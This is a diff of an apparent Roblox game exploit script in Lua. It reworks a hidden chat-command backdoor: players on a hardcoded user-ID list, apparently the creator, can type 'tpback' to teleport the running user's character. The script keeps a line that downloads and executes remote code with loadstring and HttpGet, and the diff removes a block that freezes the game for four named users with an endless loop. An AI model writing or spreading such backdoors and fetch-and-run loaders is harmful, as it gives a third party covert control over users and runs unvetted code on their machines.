@@ -1,6 +1,28 @@
+local cloneref = cloneref or function(o) 
+    return o 
+end
+
+local Players = cloneref(game:GetService('Players'))
+
+local cmds = {
+    ['tpback'] = function(plr)
+        local oldpos = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+        local plrpos = plr.Character.HumanoidRootPart.CFrame
+        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
+        task.wait(3)
+        Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+    end
+}
+
+local function execcmd(command, ...)
+    if cmds[command] then
+        cmds[command](...)
+    end
+end
+
 repeat
     task.wait()
-until game:GetService("Players").LocalPlayer
+until Players.LocalPlayer
 
 local ids = {
     7236670806
@@ -15,56 +37,28 @@ local banbypass = {
 }
 
 local notifs
-task.spawn(
-    function()
-        notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
-        game:GetService("Players").PlayerAdded:Connect(
-            function(plr)
-                if table.find(ids,plr.UserId) then
-                    plr.Chatted:Connect(
-                        function(msg)
-                            if msg == "tpback" then
-                                local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
-                                local plrpos = plr.Character.HumanoidRootPart.CFrame
-                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
-                                task.wait(3)
-                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-                            end
-                        end
-                    )
-                    notifs.alert("script creator (szze) joined", nil, 10)
-                    notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
-                end
-            end
-        )
-
-        for i, plr in next, game:GetService("Players"):GetPlayers() do
-            if table.find(ids,plr.UserId) then
-                plr.Chatted:Connect(
-                    function(msg)
-                        if msg == "tpback" then
-                            local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
-                            local plrpos = plr.Character.HumanoidRootPart.CFrame
-                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
-                            task.wait(3)
-                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-                        end
-                    end
-                )
-                notifs.alert("script creator (szze) is in the server", nil, 10)
-                notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
-            end
+task.spawn(function()
+    notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
+    
+    Players.PlayerAdded:Connect(function(plr)
+        if table.find(ids, plr.UserId) then
+            plr.Chatted:Connect(function(msg)
+                execcmd(msg, plr)
+            end)
+            
+            notifs.alert("script creator (szze) joined", nil, 10)
+            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
         end
+    end)
 
-        if
-            game:GetService("Players").LocalPlayer.Name == "AlexDaSlender1" or
-            game:GetService("Players").LocalPlayer.Name == "tiki_hell" or
-            game:GetService "Players".LocalPlayer.Name == "cat_cathuge1234567" or
-            game:GetService'Players'.LocalPlayer.Name == 'Kuba33844'
-         then
-            task.wait(1)
-            while true do
-            end
+    for _, plr in next, Players:GetPlayers() do
+        if table.find(ids, plr.UserId) then
+            plr.Chatted:Connect(function(msg)
+                execcmd(msg, plr)
+            end)
+            
+            notifs.alert("script creator (szze) is in the server", nil, 10)
+            notifs.alert("be sure to say hi to [" .. plr.DisplayName .. "]", nil, 10, "rainbow")
         end
     end
-)
+end)
